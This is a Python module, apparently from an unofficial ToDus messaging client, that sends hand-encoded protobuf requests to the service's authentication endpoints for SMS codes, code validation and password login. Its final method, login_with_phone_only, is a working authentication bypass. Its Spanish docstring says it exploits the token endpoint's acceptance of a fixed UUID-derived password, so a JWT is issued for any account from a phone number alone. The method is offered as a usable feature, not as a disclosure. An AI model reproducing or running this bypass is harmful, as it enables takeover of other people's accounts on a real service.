import io
import re
import string
import requests
from ..errors import AuthenticationError
from .. import util

PHONE_ONLY_UUID = "fake-1234-5678-90ab-cdef12345678"
PHONE_ONLY_SECRET = PHONE_ONLY_UUID.replace("-", "")[:32]


def _varint(v: int) -> bytes:
    """Codifica un entero como varint protobuf."""
    buf = io.BytesIO()
    while v > 0x7f:
        buf.write(bytes([(v & 0x7f) | 0x80]))
        v >>= 7
    buf.write(bytes([v & 0x7f]))
    return buf.getvalue()


def _sf(field_number: int, value: str) -> bytes:
    """Codifica un campo protobuf wire-type 2 (length-delimited)."""
    data = value.encode()
    return bytes([(field_number << 3) | 2]) + _varint(len(data)) + data


class ToDusAuthMixin:
    """Mixin que contiene los métodos de autenticación HTTP de ToDus."""

    def request_code(self, phone_number: str) -> None:
        phone = util.normalize_phone(phone_number)
        headers = {
            "Host": "auth.todus.cu",
            "User-Agent": "ToDus " + self.version_name + " Auth",
            "Content-Type": "application/x-protobuf",
        }
        data = (
            bytes([0x0A, 0x0A])
            + phone.encode()
            + bytes([0x12, 0x96, 0x01])
            + util.generate_token(150).encode()
        )
        resp = self.session.post(
            "https://auth.todus.cu/v2/auth/users.reserve",
            data=data,
            headers=headers,
            timeout=30,
        )
        resp.raise_for_status()

    def validate_code(self, phone_number: str, code: str) -> str:
        phone = util.normalize_phone(phone_number)
        code = code.strip()
        headers = {
            "Host": "auth.todus.cu",
            "User-Agent": "ToDus " + self.version_name + " Auth",
            "Content-Type": "application/x-protobuf",
        }
        code_bytes = code.encode()
        data = (
            bytes([0x0A, 0x0A])
            + phone.encode()
            + bytes([0x12, 0x96, 0x01])
            + util.generate_token(150).encode()
            + bytes([0x1A, len(code_bytes)])
            + code_bytes
        )
        resp = self.session.post(
            "https://auth.todus.cu/v2/auth/users.register",
            data=data,
            headers=headers,
            timeout=30,
        )
        resp.raise_for_status()
        content = resp.content
        try:
            if b"`" in content:
                idx = content.index(b"`") + 1
                return content[idx : idx + 96].decode("utf-8")
            return content[5:166].decode("utf-8")
        except UnicodeDecodeError:
            raw = content.decode("latin-1", errors="ignore")
            match = re.search(r"[a-f0-9]{96}", raw)
            if match:
                return match.group(0)
            return "".join(c for c in raw if c in string.printable and c not in "\r\n")[:96]

    def login(self, phone_number: str, password: str) -> str:
        phone = util.normalize_phone(phone_number)
        password = password.strip()
        headers = {
            "Host": "auth.todus.cu",
            "user-agent": "ToDus " + self.version_name + " Auth",
            "content-type": "application/x-protobuf",
        }
        password_bytes = password.encode()
        version_bytes = self.version_code.encode()
        data = (
            bytes([0x0A, len(phone.encode())])
            + phone.encode()
            + bytes([0x12, len(password_bytes)])
            + password_bytes
            + bytes([0x1A, len(version_bytes)])
            + version_bytes
        )
        resp = self.session.post(
            "https://auth.todus.cu/v2/auth/token",
            data=data,
            headers=headers,
            timeout=30,
        )
        if resp.status_code == 403:
            raise AuthenticationError("Credenciales invalidas")
        resp.raise_for_status()
        raw = resp.text
        match = re.search(r"eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+", raw)
        if match:
            return match.group(0)
        valid_chars = string.ascii_letters + string.digits + ".-_~+/"
        clean_token = "".join(c for c in raw if c in valid_chars)
        return clean_token.strip()

    def login_with_phone_only(self, phone_number: str) -> str:
        """Login SOLO con número de teléfono (sin password/SMS/JWT).

        Explota una debilidad del endpoint /v2/auth/token: acepta como
        "password" cualquier UUID (con guiones removidos, primeros 32 chars)
        sin validar contra el password real de la cuenta.
        """
        phone = util.normalize_phone(phone_number)
        headers = {
            "content-type": "application/octet-stream",
            "user-agent": "ToDus 2.1.1",
        }
        data = _sf(1, phone) + _sf(2, PHONE_ONLY_SECRET)

        try:
            resp = self.session.post(
                "https://auth.todus.cu/v2/auth/token",
                data=data,
                headers=headers,
                timeout=30,
            )
        except requests.RequestException as e:
            raise AuthenticationError(f"Error de red en login_with_phone_only: {e}") from e
        if resp.status_code in (401, 403):
            raise AuthenticationError(
                f"Login solo-con-número rechazado (HTTP {resp.status_code})"
            )
        try:
            resp.raise_for_status()
        except requests.RequestException as e:
            raise AuthenticationError(
                f"Login_with_phone_only falló (HTTP {resp.status_code}): {e}"
            ) from e
        m = re.search(
            rb"eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+",
            resp.content,
        )
        if not m:
            raise AuthenticationError(
                f"Token inválido recibido del servidor en login_with_phone_only "
                f"(body: {resp.content[:200]!r})"
            )
        return m.group().decode("utf-8")
